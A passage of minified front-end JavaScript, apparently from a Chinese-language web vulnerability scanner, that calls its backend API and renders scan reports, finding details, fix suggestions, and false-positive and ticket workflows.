F(e,i){ei.push({msg:e,type:i}),Ni()}function Ni(){if(kt>=Rn||ei.length===0)return;let e=ei.shift();kt++;let i=document.getElementById("toast-container");if(!i){kt--;return}let t=document.createElement("div");t.className="toast";let r="ℹ️";e.type==="error"?r="[错误]":e.type==="success"?r="[成功]":e.type==="warn"&&(r="[警告]");let s=document.createElement("span");s.textContent=r+" ",s.style.marginRight="6px",t.appendChild(s),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),kt--,Ni()},300)},Fn)}const zi="";function Di(){try{return localStorage.getItem("vs_token")}catch{return null}}function jn(){try{localStorage.removeItem("vs_token")}catch{}}function ve(){return!!Di()}function Hn(){const e=Di(),i={"Content-Type":"application/json"};return e&&(i.Authorization="Bearer "+e),i}async function ue(e,i={}){i.headers=Object.assign({},Hn(),i.headers||{});const t=!!i.skipAuthExpiry;try{const r=zi+e;let s=await fetch(r,i);if(s.status===404&&e.startsWith("/api/")&&!e.startsWith("/api/v1/")){const o=zi+"/api/v1"+e.slice(4);s=await fetch(o,i)}if(s.status===401&&!t){jn();try{localStorage.removeItem("vs_username")}catch{}throw new Error("登录状态已过期，请重新登录后再使用扫描功能")}return s}catch(r){throw r&&r.message&&r.message.indexOf("Failed to fetch")>=0?new Error("无法连接扫描服务，请确认后端服务已启动"):r}}async function Ge(e,i){const t=await ue(e,{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(i)}),r=await t.json().catch(()=>({}));return r&&typeof r=="object"&&(r._status=t.status,r._statusText=t.statusText),r}async function Ue(e){const i=await ue(e),t=await i.json().catch(()=>({}));return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function Nn(e){const i=await ue(e,{method:"DELETE"}),t=await i.json().catch(()=>({}));return t&&typeof t=="object"&&(t._status=i.status,t._statusText=i.statusText),t}async function Dn(e,i){const t=await ue(e,{method:"PATCH",body:JSON.stringify(i)}),r=await t.json().catch(()=>({}));return r&&typeof r=="object"&&(r._status=t.status,r._statusText=t.statusText),r}function Un(){return Ue("/api/config")}function $n(){return Ue("/api/me/credits")}function qn(e=20,i=0){return Ue("/api/usage?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}function Wn(e){return Ge("/api/fix-tickets",e)}function Zn(e){return Ue("/api/fix-tickets")}function ai(e,i){return Dn("/api/fix-tickets/"+e,i)}function Ui(e){return Nn("/api/fix-tickets/"+e)}function Vn(e){return ue("/api/report/src-export",{method:"POST",body:JSON.stringify(e)})}function Xn(e){return Ge("/api/finding/verify-reproduce",e)}function Gn(e){return Ge("/api/finding/feedback",e)}function Jn(){return Ue("/api/billing/plans")}function Kn(e){return Ge("/api/billing/order",e)}function Yn(e){return Ue("/api/billing/order/"+encodeURIComponent(e))}function Qn(e=50,i=0){return Ue("/api/billing/recharges?limit="+encodeURIComponent(e)+"&offset="+encodeURIComponent(i))}const er=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),Ii={critical:0,high:1,medium:2,low:3,info:4},$i={critical:"严重",high:"高危",medium:"中危",low:"低危",info:"信息"},qi={critical:"high",high:"high",medium:"medium",low:"low",info:"info"};let Ve=[],Ft=0,st="generic",Oe=null,li="",Xe=!1,Wi=0,Ot={total:0,fp_count:0};function tr(e){if(!e||!Array.isArray(e.findings)||e.findings.length===0)return!1;const i=e.findings[0];return i&&typeof i=="object"&&"id"in i&&"severity"in i&&"evidence"in i}function ir(e){Ve=sr(e.findings||[]),Ft=0,st="generic",Xe=!1,Oe=e.scan_id||null,li=e.url||"";const i=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,t=e.summary||{critical:0,high:0,medium:0,low:0,info:0,total:0},r=e.risk_level||"未知",s=e.url||"";Wi=i,Ot=t;const o=document.getElementById("result-content")||document.getElementById("result-container");if(!o){console.error("result-content not found");return}let a="";a+=or(i,r,t,s,e),e.quality&&e.quality.overall_score!==void 0&&(a+=nr(e.quality,e.dedup_stats)),a+='<div class="src-result-layout">',a+='<div class="src-result-sidebar">'+ar(Ve,Ft)+"</div>",a+='<div class="src-result-detail" id="src-detail-panel">'+di(Ve[0])+"</div>",a+="</div>",o.innerHTML=a,ci(),rr()}function nr(e,i){const t=e.overall_score||0,r=t>=80?"#73c990":t>=60?"#f0a732":"#c75450",s=e.coverage_score||0,o=e.reliability_score||0,a=e.depth_score||0,n=e.recommendations||[],c=e.coverage_breakdown||{},g=e.reliability_breakdown||{},v=c.types_detected||[],d=i||{},f=d.original_count!==void 0?`<div class="src-quality-dedup">
         <span class="src-quality-label">去重统计</span>
         <span class="src-quality-stat">原始 ${d.original_count||0}</span>
         <span class="src-quality-arrow">→</span>
         <span class="src-quality-stat highlight">${d.deduplicated_count||0}</span>
         ${d.duplicate_count>0?`<span class="src-quality-tag">移除重复 ${d.duplicate_count}</span>`:""}
         ${d.correlation_groups>0?`<span class="src-quality-tag">关联组 ${d.correlation_groups}</span>`:""}
       </div>`:"",h=g.fp_rate!==void 0?(g.fp_rate*100).toFixed(0)+"%":"-",m=g.high_confidence_rate!==void 0?(g.high_confidence_rate*100).toFixed(0)+"%":"-";return`
    <div class="src-quality-panel" id="src-quality-panel">
      <div class="src-quality-header" id="src-quality-toggle">
        <div class="src-quality-score-wrap">
          <div class="src-quality-ring" style="border-color:${r}">
            <span style="color:${r};font-size:22px;font-weight:700">${t}</span>
          </div>
          <span class="src-quality-title">扫描可信度</span>
        </div>
        <div class="src-quality-bars">
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">覆盖度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${s}%;background:${s>=80?"#73c990":s>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${s}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">可靠性</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${o}%;background:${o>=80?"#73c990":o>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${o}</span>
          </div>
          <div class="src-quality-bar-row">
            <span class="src-quality-bar-label">深度</span>
            <div class="src-quality-bar"><div class="src-quality-bar-fill" style="width:${a}%;background:${a>=80?"#73c990":a>=60?"#f0a732":"#c75450"}"></div></div>
            <span class="src-quality-bar-val">${a}</span>
          </div>
        </div>
        <button class="src-quality-expand" id="src-quality-expand-btn">查看明细</button>
      </div>
      <div class="src-quality-detail" id="src-quality-detail" style="display:none">
        <div class="src-quality-grid">
          <div class="src-quality-section">
            <div class="src-quality-section-title">覆盖面说明</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>检测漏洞类型</span><code>${v.length} 种</code></div>
              <div class="src-quality-kv"><span>类型列表</span><code>${E(v.join(", ")||"-")}</code></div>
              <div class="src-quality-kv"><span>总发现数</span><code>${c.total_findings||0}</code></div>
            </div>
          </div>
          <div class="src-quality-section">
            <div class="src-quality-section-title">结果可信度</div>
            <div class="src-quality-section-body">
              <div class="src-quality-kv"><span>误报率</span><code>${h}</code></div>
              <div class="src-quality-kv"><span>高置信度比例</span><code>${m}</code></div>
              <div class="src-quality-kv"><span>潜在误报数</span><code>${g.fp_count||0}</code></div>
              <div class="src-quality-kv"><span>高置信度数</span><code>${g.high_confidence_count||0}</code></div>
            </div>
          </div>
        </div>
        ${f}
        ${n.length>0?`
          <div class="src-quality-recommendations">
            <div class="src-quality-section-title">交付建议</div>
            <ul class="src-quality-rec-list">
              ${n.map(u=>`<li>${E(u)}</li>`).join("")}
            </ul>
          </div>
        `:""}
      </div>
    </div>
  `}function rr(){const e=document.getElementById("src-quality-toggle"),i=document.getElementById("src-quality-detail"),t=document.getElementById("src-quality-expand-btn");!e||!i||!t||(e.addEventListener("click",function(r){if(r.target===t)return;const s=i.style.display!=="none";i.style.display=s?"none":"block",t.textContent=s?"查看明细":"收起明细"}),t.addEventListener("click",function(r){r.stopPropagation();const s=i.style.display!=="none";i.style.display=s?"none":"block",t.textContent=s?"查看明细":"收起明细"}))}function sr(e){return e.slice().sort((i,t)=>{const r=Ti(i.verification_status),s=Ti(t.verification_status);if(r!==s)return r-s;const o=i.is_likely_fp?1:0,a=t.is_likely_fp?1:0;if(o!==a)return o-a;const n=Ii[(i.severity||"").toLowerCase()]??99,c=Ii[(t.severity||"").toLowerCase()]??99;return n!==c?n-c:(t.severity_score||0)-(i.severity_score||0)})}function Ti(e){const i=String(e||"").toLowerCase();return i==="confirmed"?0:i==="probable"?1:i==="suspected"?2:3}function or(e,i,t,r,s){const o=Lt(e);Pt(e);const a=Hi(i),n=s.duration_ms?`<span class="meta-item">耗时 ${s.duration_ms}ms</span>`:"",c=s.scan_id?`<span class="meta-item">扫描 #${s.scan_id}</span>`:"",g=s.report_share_id?`<span class="meta-item">报告 ${E(s.report_share_id)}</span>`:"",v=s.scan_id&&ve()?'<button class="src-export-btn" id="src-export-markdown" title="导出 SRC 格式 Markdown 报告">导出 SRC 报告</button>':"",f=(s.quality||{}).overall_score||0,h=f>0?`<span class="meta-item" style="color:${f>=80?"#73c990":f>=60?"#f0a732":"#c75450"}">质量 ${f}分</span>`:"",m=s.verification_stats||{},u=m.enabled?`<span class="meta-item verification-badge">
        <span class="v-confirmed" title="已验证">${m.confirmed||0}</span>
        <span class="v-probable" title="待确认">${m.probable||0}</span>
        <span class="v-suspected" title="待复测">${m.suspected||0}</span>
       </span>`:"",y=t.total||0,b=t.fp_count||0,k=Math.max(0,y-b),x=t.critical||0,I=t.high||0,z=t.medium||0,M=t.low||0,O=t.info||0,j=x+I>0?"优先处理严重与高危项，先关闭外部暴露面。":z>0?"先处理中危项，再复扫验证修复是否生效。":"当前结果偏健康，可作为客户基线留存并持续监控。",P="本次扫描共发现 "+y+" 项问题，其中 "+k+" 项建议优先处理。",U="本报告面向客户交付、上线前验收和复扫留档，突出已验证问题、待确认风险与待复测项，并可直接作为交付附件、复测记录和修复跟踪底稿。",Y=s.scan_id?'<div class="src-report-action-hint">建议优先处理“已验证”和“待确认”项；“待复测”项通常表示证据不足或环境干扰，请先复测或人工确认后再进入工单。</div>':"";return`
    <div class="src-report-header fade-in-up">
      <div class="src-score-wrap">
        <div class="src-score-ring" style="background:${o};color:#fff">
          <div class="src-score-value">${e}</div>
          <div class="src-score-label">安全评分</div>
        </div>
      </div>
      <div class="src-report-meta">
        <div class="src-report-title-row">
          <span class="risk-badge ${a}">${E(i)}</span>
          <span class="src-report-url">${E(r)}</span>
        </div>
        <div class="src-report-stats">
          <div class="src-stat critical"><div class="num">${x}</div><div class="label">严重</div></div>
          <div class="src-stat high"><div class="num">${I}</div><div class="label">高危</div></div>
          <div class="src-stat medium"><div class="num">${z}</div><div class="label">中危</div></div>
          <div class="src-stat low"><div class="num">${M}</div><div class="label">低危</div></div>
          <div class="src-stat info"><div class="num">${O}</div><div class="label">信息</div></div>
          <div class="src-stat total"><div class="num">${y}</div><div class="label">总计</div></div>
          <div class="src-stat" style="background:rgba(115,201,144,0.08)"><div class="num" style="color:#73c990">${k}</div><div class="label">待处理</div></div>
        </div>
        <div class="src-report-submeta">
          ${c}${n}${g}${h}${u}
          <span class="meta-item">发现于 ${Nt(s.discovered_at||new Date().toISOString())}</span>
        </div>
        <div class="src-report-actions">
          ${v}
          <button class="src-export-btn" id="src-copy-summary" title="复制当前报告摘要">复制摘要</button>
        </div>
        <div class="src-report-summary">${E(P)}</div>
        <div class="src-report-intro">${E(U)}</div>
        <div class="src-report-exec-summary">
          <div class="src-report-exec-title">客户摘要</div>
          <div class="src-report-exec-text">本次结果已按风险优先级、验证状态和可信度整理，便于直接确认需要修复的问题、待复测项和疑似误报项。建议先关闭高危与已验证项，再复测中低风险项并保留证据链，适合作为客户沟通与交付附件。</div>
        </div>
        <div class="src-report-next-step">
          <div class="src-report-next-step-title">交付建议</div>
          <div class="src-report-next-step-text">${E(j)}${b>0?" 已自动识别 "+b+" 项潜在误报，系统默认优先显示更可信的结果。":""}</div>
          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
            <button class="src-filter-btn" onclick="navigateTo('tickets')">去工单</button>
            <button class="src-filter-btn" onclick="navigateTo('fixer')">去修复器</button>
          </div>
          ${Y}
        </div>
      </div>
    </div>
  `}function ar(e,i){let t=Xe?e.filter(o=>!o.is_likely_fp):e,r=e.length-t.length,s='<div class="src-list-header">漏洞列表 <span class="src-list-count">'+t.length+"</span>";return s+='<button class="src-filter-btn" data-action="toggle-fp-filter" title="切换可疑项显示">'+(Xe?"显示全部":"优先可信项")+"</button>",r>0&&(s+='<span class="src-filter-note">已隐藏 '+r+" 项</span>"),s+="</div>",s+='<div class="src-list-items">',e.length===0?s+='<div class="src-empty">'+(Xe?"当前筛选下没有结果":"未发现漏洞")+"</div>":t.forEach((o,a)=>{const n=(o.severity||"info").toLowerCase(),c=qi[n]||"info",g=a===i?"active":"",v=o.parameter?`<code class="src-list-param">${E(o.parameter)}</code>`:"",d=o.type?`<span class="src-list-type">${E(o.type.toUpperCase())}</span>`:"",f=o.url?new URL(o.url,window.location.href).hostname:"",h=o.url?new URL(o.url,window.location.href).pathname:"",m=o.is_likely_fp?'<span class="src-list-fp-tag" title="需要人工复测">待复测</span>':"",u=o.correlation_group?`<span class="src-list-corr" title="关联组 ${be(o.correlation_group)}（${o.correlation_size||0} 个相关）">${E(o.correlation_group)}</span>`:"",y=o.merged_count>1?`<span class="src-list-merged" title="合并了 ${o.merged_count} 个重复项">×${o.merged_count}</span>`:"",b=o.verification_status,k=b==="confirmed"?'<span class="src-list-v confirmed" title="已验证">✓</span>':b==="probable"?'<span class="src-list-v probable" title="可能存在">?</span>':b==="suspected"?'<span class="src-list-v suspected" title="存疑">!</span>':"",x=o.user_feedback?o.user_feedback.is_false_positive?'<span class="src-list-fb fp" title="您已标记为误报">误报</span>':'<span class="src-list-fb confirmed" title="您已确认有效">确认</span>':"",I=String(o.adjusted_confidence||o.confidence||"medium"),z=I==="high"?"高可信":I==="medium"?"中可信":I==="low"?"低可信":I;s+=`
        <div class="src-list-item ${g} ${c}" data-index="${a}">
          <div class="src-list-row top">
            <span class="src-sev-badge ${c}">${$i[n]}</span>
            <span class="src-list-title" title="${be(o.title||"")}">${E(o.title||"未命名漏洞")}</span>
            ${k}${x}${m}${y}
          </div>
          <div class="src-list-row meta">
            ${d}
            ${v}
            <span class="src-list-host" title="${be(o.url||"")}">${E(f)}${E(h)}</span>
            <span class="src-list-confidence ${E(I)}">${E(z)}</span>
            ${u}
          </div>
        </div>
      `}),s+="</div>",s}function di(e,i){if(!e)return'<div class="src-empty-detail">请从左侧选择漏洞查看详情</div>';const t=(e.severity||"info").toLowerCase(),r=qi[t]||"info",s=$i[t]||"信息",o=e.evidence||{},a=e.location_detail||{},n={open:"待处理",confirmed:"已确认",false_positive:"误报",fixed:"已修复"},c=e.status||"open";let g='<div class="src-detail-card fade-in-up">';if(g+=`<div class="src-detail-header">
    <div class="src-detail-title-row">
      <span class="src-detail-severity ${r}">${s}</span>
      <h2 class="src-detail-title">${E(e.title||"未命名漏洞")}</h2>
      <span class="src-detail-status ${c}">${n[c]||c}</span>
    </div>
    <div class="src-detail-subtitle">
      <code class="src-detail-id">${E(e.id||"")}</code>
      <span class="src-detail-type">${E(e.type||"").toUpperCase()}</span>
      ${e.cwe_id?`<span class="src-detail-cwe" title="Common Weakness Enumeration">${E(e.cwe_id)}</span>`:""}
      ${e.owasp_category?`<span class="src-detail-owasp">${E(e.owasp_category)}</span>`:""}
      ${e.cvss_score?`<span class="src-detail-cvss" title="${E(e.cvss_vector||"")}">CVSS ${e.cvss_score}</span>`:""}
      ${e.severity_score?`<span class="src-detail-score">评分 ${e.severity_score}/10</span>`:""}
      <span class="src-detail-confidence">置信度 ${E(e.adjusted_confidence||e.confidence||"medium")}</span>
      ${e.verification_status?`<span class="src-detail-verify-badge ${e.verification_status}">${e.verification_status==="confirmed"?"已验证":e.verification_status==="probable"?"可能存在":"存疑"}</span>`:""}
      ${e.is_likely_fp?'<span class="src-detail-fp-badge">待复测</span>':""}
      ${e.user_feedback?e.user_feedback.is_false_positive?'<span class="src-detail-fp-badge" title="您已标记为误报">已标记误报</span>':'<span class="src-detail-verify-badge verified" title="您已确认有效">您已确认</span>':""}
    </div>
  </div>`,g+=`<div class="src-detail-tabs">
    <button class="src-detail-tab active" data-tab="overview">概览</button>
    <button class="src-detail-tab" data-tab="evidence">请求 / 响应</button>
    <button class="src-detail-tab" data-tab="fix">修复</button>
  </div>`,g+='<div class="src-detail-panel active" data-panel="overview">',e.fp_score!==void 0||e.verification_score!==void 0||e.fp_reasons&&e.fp_reasons.length>0){if(g+=`<div class="src-detail-section">
      <div class="src-section-title">可信度判断</div>
      <div class="src-section-body">`,e.fp_score!==void 0){const m=(e.fp_score*100).toFixed(0),u=e.fp_score>=.5?"#c75450":e.fp_score>=.3?"#f0a732":"#73c990";g+=`<div class="src-kv"><span class="src-k">误报概率</span><span class="src-v" style="color:${u}">${m}%</span></div>`}if(e.verification_score!==void 0){const m=e.verification_score>=80?"#73c990":e.verification_score>=60?"#f0a732":"#c75450";g+=`<div class="src-kv"><span class="src-k">验证得分</span><span class="src-v" style="color:${m}">${e.verification_score}/100</span></div>`}e.verification_techniques&&e.verification_techniques.length>0&&(g+=`<div class="src-kv"><span class="src-k">验证技术</span><span class="src-v">${E(e.verification_techniques.join(", "))}</span></div>`),e.fp_reasons&&e.fp_reasons.length>0&&(g+=`<div class="src-fp-reasons"><ul>${e.fp_reasons.map(m=>`<li>${E(m)}</li>`).join("")}</ul></div>`),g+="</div></div>"}g+=`<div class="src-detail-section">
    <div class="src-section-title">漏洞描述</div>
    <div class="src-section-body">${E(e.description||"暂无描述")}</div>
  </div>`,g+=`<div class="src-detail-section">
    <div class="src-section-title">实际影响</div>
    <div class="src-section-body">${E(e.impact||"暂无影响说明")}</div>
  </div>`,g+=`<div class="src-detail-section">
    <div class="src-section-title">精准位置</div>
    <div class="src-section-body">
      <div class="src-kv"><span class="src-k">URL</span><code class="src-v">${E(a.url||e.url||"")}</code></div>
      ${a.method?`<div class="src-kv"><span class="src-k">方法</span><code class="src-v">${E(a.method)}</code></div>`:""}
      ${a.parameter||e.parameter?`<div class="src-kv"><span class="src-k">参数</span><code class="src-v">${E(a.parameter||e.parameter)}</code></div>`:""}
      ${a.parameter_type?`<div class="src-kv"><span class="src-k">参数类型</span><code class="src-v">${E(a.parameter_type)}</code></div>`:""}
      ${a.code_location?`<div class="src-kv"><span class="src-k">代码位置</span><code class="src-v">${E(a.code_location)}</code></div>`:""}
      ${a.snippet?`<div class="src-kv"><span class="src-k">上下文</span><span class="src-v">${E(a.snippet)}</span></div>`:""}
      ${!a.url&&e.location?`<div class="src-kv"><span class="src-k">位置</span><span class="src-v">${E(e.location)}</span></div>`:""}
    </div>
  </div>`,Array.isArray(e.reproduce_steps)&&e.reproduce_steps.length>0&&(g+=`<div class="src-detail-section">
      <div class="src-section-title">复现步骤</div>
      <ol class="src-repro-steps">`,e.reproduce_steps.forEach(m=>{g+=`<li>${E(m)}</li>`}),g+="</ol></div>"),g+="</div>",g+='<div class="src-detail-panel" data-panel="evidence">',g+=lr(o,e),g+="</div>",g+='<div class="src-detail-panel" data-panel="fix">';const v=e.fix_suggestion||"暂无修复建议",d=v.split(/\n+/).map(m=>m.trim()).filter(Boolean),f=d[0]||"暂无修复建议",h=d.slice(1,4);return g+=`<div class="src-detail-section">
    <div class="src-section-title">修复结论</div>
    <div class="src-section-body">
      <div style="font-weight:700;margin-bottom:6px;color:var(--text-primary)">${E(f)}</div>
      <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">${E(v)}</div>
    </div>
  </div>`,h.length>0&&(g+=`<div class="src-detail-section">
      <div class="src-section-title">执行步骤</div>
      <div class="src-section-body"><ol style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">`,h.forEach(m=>{g+=`<li>${E(m)}</li>`}),g+="</ol></div></div>"),g+=`<div class="src-detail-section">
    <div class="src-section-title">修复完成后的检查</div>
    <div class="src-section-body"><ul style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">
      <li>重新扫描同一地址，确认对应漏洞已消失。</li>
      <li>核对安全头、Cookie、重定向或页面响应是否符合预期。</li>
      <li>如果为高危项，建议先在测试环境验证再发布到生产。</li>
    </ul></div>
  </div>`,g+=dr(e.fix_code||{}),g+="</div>",Array.isArray(e.references)&&e.references.length>0&&(g+=`<div class="src-detail-section">
      <div class="src-section-title">参考资料</div>
      <ul class="src-references">`,e.references.forEach(m=>{g+=`<li><a href="${be(m)}" target="_blank" rel="noopener">${E(m)}</a></li>`}),g+="</ul></div>"),Oe&&ve()&&(g+=`<div class="src-detail-actions">
      <button class="src-action-btn verify" data-action="verify" data-finding-id="${be(e.id||"")}" title="重新请求目标并尝试验证是否仍可复现">验证复现</button>
      <button class="src-action-btn false-positive" data-action="fp" data-finding-id="${be(e.id||"")}" title="如果你判断该项不是实际漏洞，可标记为误报或观察项">标记误报</button>
      <button class="src-action-btn confirm" data-action="confirm" data-finding-id="${be(e.id||"")}" title="如果你确认该项真实存在，可标记为有效漏洞并进入修复流程">确认有效</button>
      <button class="src-action-btn ticket" data-action="ticket" data-finding-id="${be(e.id||"")}" title="将该漏洞转为修复工单并跟踪处理">创建工单</button>
    </div>`),g+=`<div class="src-detail-footer">
    <span>发现时间：${Nt(e.discovered_at||"")}</span>
  </div>`,g+="</div>",g}function lr(e,i){const t=!!e.request,r=!!e.response,s=!!e.payload,o=!!e.screenshot,a=!!e.notes,n=!!e.matched_signature,c=Ci(e.request),g=Ci(e.response);let v='<div class="src-detail-section">';(s||n||a)&&(v+=`<div class="src-section-title">命中信息</div>
    <div class="src-section-body src-evidence-meta">`,s&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">Payload</span>
        <code class="src-payload">${E(e.payload)}</code>
        <button class="src-copy-btn" data-copy="${be(e.payload)}">复制</button>
      </div>`),n&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">命中签名</span>
        <code class="src-signature">${E(e.matched_signature)}</code>
      </div>`),a&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">备注</span>
        <span>${E(e.notes)}</span>
      </div>`),v+="</div>"),v+=`<div class="src-section-title">证据摘要</div>
    <div class="src-section-body src-evidence-meta">`;const d=i.verification_status||(i.is_likely_fp?"suspected":"probable");return v+=`<div class="src-evidence-row"><span class="src-evidence-label">可信度</span><span>${E(d==="confirmed"?"已验证":d==="probable"?"可能存在":"待复测")}</span></div>`,v+=`<div class="src-evidence-row"><span class="src-evidence-label">误报概率</span><span>${i.fp_score!==void 0?(i.fp_score*100).toFixed(0)+"%":"—"}</span></div>`,c&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">请求摘要</span><span>${E(c)}</span></div>`),g&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">响应摘要</span><span>${E(g)}</span></div>`),v+="</div>",(t||r)&&(v+=`<div class="src-section-title">HTTP 流量</div>
    <div class="src-traffic-viewer">`,t&&(v+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>请求</span>
          <button class="src-copy-btn" data-copy="${be(e.request)}">复制</button>
        </div>
        <pre><code>${E(e.request)}</code></pre>
      </div>`),r&&(v+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>响应</span>
          <button class="src-copy-btn" data-copy="${be(e.response)}">复制</button>
        </div>
        <pre><code>${E(e.response)}</code></pre>
      </div>`),v+="</div>"),o&&(v+=`<div class="src-screenshot-row">
      <span class="src-evidence-label">截图</span>
      <img src="${be(e.screenshot)}" alt="证据截图" loading="lazy">
    </div>`),!t&&!r&&!s&&!o&&!a&&!n&&(v+=`<div class="src-section-title">技术证据</div>
    <div class="src-section-body"><div class="src-no-evidence">无详细技术证据</div></div>`),v+="</div>",v}function Ci(e){if(!e)return"";const i=String(e).split(/\r?\n/).map(n=>n.trim()).filter(Boolean);if(!i.length)return"";const t=i.find(n=>/^HTTP\/\d/i.test(n)),r=i.find(n=>/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+/i.test(n)),s=r?r.split(/\s+/).slice(0,2).join(" "):"",o=i.filter(n=>/^[A-Za-z0-9\-]+:\s*/.test(n)).slice(0,3),a=[];return t&&a.push(t.replace(/^HTTP\/\d\.\d\s*/i,"HTTP ")),s&&a.push(s),o.length&&a.push(o.join(" | ")),a.join(" · ").slice(0,220)}function dr(e){const t=[{key:"nginx",label:"Nginx"},{key:"apache",label:"Apache"},{key:"express",label:"Express"},{key:"flask",label:"Flask"},{key:"spring_boot",label:"Spring Boot"},{key:"cloudflare",label:"Cloudflare"},{key:"generic",label:"通用"}].filter(s=>e[s.key]);if(t.length===0)return"";let r=`<div class="src-detail-section">
    <div class="src-section-title">修复代码</div>
    <div class="src-fix-tabs">`;return t.forEach(s=>{const o=s.key===st?"active":"";r+=`<button class="src-fix-tab ${o}" data-tab="${s.key}">${s.label}</button>`}),r+="</div>",t.forEach(s=>{const o=s.key===st?"active":"hidden";r+=`<div class="src-fix-panel ${o}" data-panel="${s.key}">
      <pre><code>${E(e[s.key])}</code></pre>
      <button class="src-copy-btn" data-copy="${be(e[s.key])}">复制代码</button>
    </div>`}),r+="</div>",r}function ci(){document.querySelectorAll(".src-list-item").forEach(e=>{e.addEventListener("click",function(){const i=parseInt(this.dataset.index,10);fr(i)})}),document.querySelectorAll(".src-detail-tab").forEach(e=>{e.addEventListener("click",function(){const i=this.dataset.tab,t=this.closest(".src-detail-card");t&&(t.querySelectorAll(".src-detail-tab").forEach(r=>r.classList.remove("active")),this.classList.add("active"),t.querySelectorAll(".src-detail-panel").forEach(r=>{r.classList.toggle("active",r.dataset.panel===i)}))})}),document.querySelectorAll(".src-fix-tab").forEach(e=>{e.addEventListener("click",function(){st=this.dataset.tab,document.querySelectorAll(".src-fix-tab").forEach(i=>i.classList.remove("active")),this.classList.add("active"),document.querySelectorAll(".src-fix-panel").forEach(i=>{i.classList.toggle("active",i.dataset.panel===st),i.classList.toggle("hidden",i.dataset.panel!==st)})})}),document.querySelectorAll(".src-copy-btn").forEach(e=>{e.addEventListener("click",function(i){i.stopPropagation();const t=this.dataset.copy||"";ht(t).then(()=>F("已复制到剪贴板"))})}),document.querySelectorAll(".src-export-btn").forEach(e=>{e.id==="src-copy-summary"?e.addEventListener("click",cr):e.addEventListener("click",pr)}),document.querySelectorAll(".src-filter-btn").forEach(e=>{e.addEventListener("click",function(){Xe=!Xe;const i=Xe?Ve.filter(r=>!r.is_likely_fp):Ve;Ft=0;const t=document.getElementById("src-detail-panel");t&&(t.innerHTML=di(i[0])),ci()})}),document.querySelectorAll(".src-action-btn").forEach(e=>{e.addEventListener("click",ur)})}async function cr(){if(!Oe)return;const i=Array.from(document.querySelectorAll(".finding-card")).slice(0,3).map((s,o)=>{const a=s.querySelector(".finding-title"),n=s.querySelector(".finding-severity");return`${o+1}. ${a?a.textContent.trim():"未命名项"}${n?`（${n.textContent.trim()}）`:""}`}).filter(Boolean),t=Math.max(0,(Ot.total||0)-(Ot.fp_count||0)),r=["报告摘要","扫描 ID: "+Oe,"URL: "+li,"安全评分: "+Wi,"总计: "+(Ot.total||0),"待处理: "+t,i.length?`重点项:
`+i.join(`
`):"重点项: 无","建议: 优先处理高危和严重项，修复后复测。"].join(`
`);await ht(r),F("报告摘要已复制")}async function pr(){if(Oe)try{const i=await(await Vn({scan_id:Oe,format:"markdown"})).blob(),t=URL.createObjectURL(i),r=document.createElement("a");r.href=t,r.download=`src-report-${Oe}.md`,document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(t),F("SRC 报告已开始下载")}catch(e){F("导出失败："+(e&&e.message?e.message:"未知错误"))}}async function ur(e){const i=e.currentTarget,t=i.dataset.action,r=i.dataset.findingId,s=Ve.find(n=>n.id===r);if(!Oe||!s)return;if(t==="verify"){i.textContent="验证中...",i.disabled=!0;try{const n=await Xn({scan_id:Oe,finding_id:r,url:s.url||li});if(n&&n.success){const c=n.reproducible===!0?"仍可复现":n.reproducible===!1?"已无法复现":"需人工复测";F(`验证完成：${c}`)}else F("验证失败："+(n&&n.error?n.error:"未知错误"))}catch{F("验证请求失败")}finally{i.textContent="验证复现",i.disabled=!1}return}const o=t==="fp"?"标记中...":t==="ticket"?"创建中...":"提交中...",a=t==="fp"?"标记误报":t==="ticket"?"创建工单":"确认有效";i.textContent=o,i.disabled=!0;try{if(t==="ticket"){const n=await Wn({scan_id:Oe,finding_name:s.title||r,severity:s.severity||"low",fix_code:s.fix_code&&s.fix_code.generic?s.fix_code.generic:"",notes:s.fix_suggestion||s.description||""});n&&n.success?(F("工单已创建，已进入修复列表"),setTimeout(function(){er("tickets")},300)):F("工单创建失败："+(n&&n.error?n.error:"未知错误"))}else{const n=await Gn({scan_id:Oe,finding_name:s.title||r,finding_type:s.type||"",is_false_positive:t==="fp",is_confirmed:t==="confirm"});n&&n.success?F(t==="fp"?"已标记为误报，后续会用于优化检测":"已确认漏洞，已记录到反馈闭环"):F("反馈提交失败："+(n&&n.error?n.error:"未知错误"))}}catch{F(t==="ticket"?"工单创建失败":"反馈请求失败")}finally{i.textContent=a,i.disabled=!1}}function fr(e){Ft=e,document.querySelectorAll(".src-list-item").forEach((t,r)=>{t.classList.toggle("active",r===e)});const i=document.getElementById("src-detail-panel");i&&(i.innerHTML=di(Ve[e]),ci())}function gr(){if(document.getElementById("src-result-styles"))return;const e=document.createElement("style");e.id="src-result-styles",e.textContent=`
